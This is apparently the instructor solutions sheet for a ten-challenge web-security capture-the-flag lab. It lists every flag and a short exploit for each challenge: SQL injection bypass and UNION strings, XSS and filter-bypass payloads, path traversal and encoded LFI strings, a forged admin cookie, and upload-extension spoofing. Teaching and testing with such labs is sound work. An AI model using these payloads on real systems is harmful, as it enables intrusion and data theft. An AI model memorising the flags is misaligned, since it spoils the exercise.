# 🔑 SOLUTIONS (instructor copy)

Flags and minimal exploits. Keep private.

| # | Challenge | Port | Pts | Flag |
|---|-----------|------|-----|------|
| 1 | IDOR — Easy | 8001 | 100 | `FLAG{idor_h0rizontal_pr1v_esc}` |
| 2 | Broken Access — Hard | 8002 | 250 | `FLAG{broken_access_vertical_esc}` |
| 3 | SQLi — Login Bypass | 8003 | 100 | `FLAG{sql1_auth_bypass_comment}` |
| 4 | SQLi — UNION | 8004 | 250 | `FLAG{un1on_based_data_dump}` |
| 5 | XSS — Reflected | 8005 | 100 | `FLAG{r3flected_xss_proven}` |
| 6 | XSS — Stored+Bypass | 8006 | 250 | `FLAG{st0red_xss_filter_bypass}` |
| 7 | Path Traversal | 8007 | 100 | `FLAG{path_traversal_dotdot}` |
| 8 | LFI — Bypass | 8008 | 250 | `FLAG{lfi_encoded_traversal_bypass}` |
| 9 | Upload — Unrestricted | 8009 | 100 | `FLAG{unrestricted_upload_served}` |
| 10 | Upload — Bypass | 8010 | 250 | `FLAG{upload_filter_bypass_exec}` |

**Total: 1750 pts**

Run everything automatically: `./solve_all.sh` (add `RESET=1` to wipe the scoreboard first).

## 1 — IDOR (built)
Log in `101/password101`, then `GET /account?id=102` → flag in the secret field.

## 2 — Broken Access (Hard)
Discover `/admin` (listed in `robots.txt`, unlinked in UI). Set cookie `role=admin` (server trusts the client
value) → `/admin` returns the flag.

## 3 — SQLi login bypass
Username `admin' --`  (or `' OR '1'='1' --`), any password → authenticated as admin → flag.

## 4 — SQLi UNION
`' ORDER BY 2 --` to find column count, then `' UNION SELECT flag, NULL FROM secrets --` → flag in output.

## 5 — Reflected XSS
`GET /?q=<script>solve()</script>` → `solve()` reveals the flag.

## 6 — Stored XSS + bypass
`script` is blacklisted. Store a comment `<img src=x onerror=steal()>` (or `<svg onload=steal()>`); the
`/admin/visit` bot "runs" it and the admin cookie (= flag) shows up at `/collector`.

## 7 — Path traversal
`GET /download?file=../../secret/flag.txt` → flag (curl needs `--path-as-is`).

## 8 — LFI bypass
Naive filter strips `../` once → use `....//....//secret/flag.txt` or `..%2f..%2fsecret%2fflag.txt` → flag.

## 9 — Unrestricted upload
Upload `x.html` containing `<script src="/static/ctf.js"></script><script>solve()</script>`; open
`/uploads/x.html` → flag (`solve()` only pays out when called from an upload rendered as HTML/SVG).

## 10 — Upload bypass
Filter blocks the last extension case-sensitively and trusts the client Content-Type; the server types
files by their FIRST known extension. Upload the same payload as `x.HtMl` (spoof `Content-Type: image/png`)
or as `x.html.png`; open `/uploads/<name>` → flag.
